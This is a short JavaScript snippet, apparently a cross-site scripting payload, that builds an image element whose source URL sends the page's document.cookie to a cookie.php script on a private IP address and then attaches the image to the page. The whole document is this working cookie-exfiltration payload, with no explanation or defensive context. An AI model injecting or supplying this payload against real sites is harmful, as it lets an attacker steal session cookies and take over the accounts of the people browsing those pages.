var img = new Image();
img.src = "http://192.168.2.2/cookie.php?q="+document.cookie;
document.body.append(img);
